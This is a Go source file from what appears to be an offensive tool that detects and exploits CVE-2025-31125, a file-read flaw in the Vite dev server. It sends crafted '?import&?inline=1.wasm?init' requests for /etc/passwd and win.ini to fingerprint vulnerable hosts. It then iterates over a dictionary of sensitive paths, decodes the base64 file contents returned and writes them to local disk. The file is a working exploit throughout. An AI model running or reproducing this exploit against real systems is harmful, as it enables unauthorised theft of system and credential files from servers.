package cmd

import (
	"bufio"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"strings"
)

func (target *Target) check_CVE_2025_31125(sep string) (platform string, isVul bool) {
	INFO("[*] 检测目标：%s是否存在CVE_2025_31125\n", target.Url)
	resp, err := Request(target.Url)
	if err != nil {
		return "", false
	}
	defer resp.Body.Close()
	content, err := io.ReadAll(resp.Body)
	re := regexp.MustCompile(`<script type="module" src="(?:https?:\/\/[^\/]+)?(.*?)/@vite/client"`)
	matches := re.FindStringSubmatch(string(content))
	if len(matches) >= 2 {
		rootPath := matches[1]
		target.RootPath = rootPath
	}
	nixPayload := "/etc/passwd?import&?inline=1.wasm?init"
	resp1, err := Request(target.Url + sep + target.RootPath + nixPayload)
	if err == nil {
		defer resp1.Body.Close()
		content, err := io.ReadAll(resp1.Body)
		if err == nil {
			if strings.Contains(string(content), "data:application/octet-stream;base64") {
				target.Platform = "linux"
				return "linux", true
			}
		}
	}
	winPayload := "/C://windows/win.ini?import&?inline=1.wasm?init"
	resp2, err := Request(target.Url + sep + target.RootPath + winPayload)
	if err != nil {
		return "", false
	}
	defer resp2.Body.Close()
	content2, err := io.ReadAll(resp2.Body)
	if strings.Contains(string(content2), "data:application/octet-stream;base64") {
		target.Platform = "windows"
		return "windows", true
	}
	return "", false
}

// 根据相应的平台进行深度利用，比如读取敏感文件并保存到本地
func (target Target) exploit_CVE_2025_31125(sep string) (bool, error) {
	sensitivePathFile := path.Join(RootDir, "dict/"+target.Platform+"_sensitive_path.txt")
	file, err := os.Open(sensitivePathFile)
	if err != nil {
		return false, err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		sensitivePath := scanner.Text()
		sensitivePath = strings.Replace(sensitivePath, "\\", "/", -1)
		testValUrl := target.Url + target.RootPath + sep + sensitivePath + "?import&?inline=1.wasm?init"
		response, err := Request(testValUrl)
		if err != nil {
			continue
		}
		defer response.Body.Close()
		resp, err := io.ReadAll(response.Body)
		content := string(resp)
		if !strings.Contains(content, "data:application/octet-stream;base64") {
			continue
		}
		fileName := path.Join(target.HOST, sensitivePath)
		fileName = path.Join(ResultDir, fileName)
		ok, err := writeContentToFile2(content, fileName)
		if !ok {
			ERROR("[-] 解析%s网站内容时出现错误：%s 请手动检测该端点！\n", testValUrl, err.Error())
			continue
		}
		SUCCESS("[+] 对%s的漏洞利用成功！敏感文件已经写入到%s中\n", testValUrl, fileName)
	}
	info, err := os.Stat(path.Join(ResultDir, target.HOST))
	if err != nil {
		if os.IsNotExist(err) {
			return false, errors.New("利用失败!")
		}
		return false, err
	}
	return info.IsDir(), nil
}

func writeContentToFile2(content string, filePath string) (bool, error) {
	parts := strings.Split(content, "//#")
	// 检查分割后的结果，取第一部分
	if len(parts) == 0 {
		return false, errors.New("解析内容失败!")
	}
	afterComment := parts[0]
	re := regexp.MustCompile(`(data:application/octet-stream;base64,|data:text/plain;base64,)(.*)"\)`)
	matches := re.FindStringSubmatch(afterComment)
	if len(matches) < 3 {
		return false, errors.New("正则解析内容失败!")
	}
	base64Content := matches[2]
	base64Content = strings.TrimSpace(base64Content)
	sensitiveByte, err := base64.StdEncoding.DecodeString(base64Content)
	if err != nil {
		return false, errors.New("正则解析内容失败!")
	}
	sensitiveContent := string(sensitiveByte)
	dir := filepath.Dir(filePath)
	err = os.MkdirAll(dir, 0777)
	if err != nil {
		return false, errors.New(fmt.Sprintf("创建目录\"%s\"失败!", dir))
	}
	file, err := os.Create(filePath)
	if err != nil {
		return false, errors.New(fmt.Sprintf("创建\"%s\"文件失败！", filePath))
	}
	defer file.Close()
	writer := bufio.NewWriter(file)
	defer writer.Flush()
	_, err = writer.WriteString(sensitiveContent)
	if err != nil {
		return false, errors.New(fmt.Sprintf("往\"%s\"中写入内容失败！", filePath))
	}
	return true, nil
}
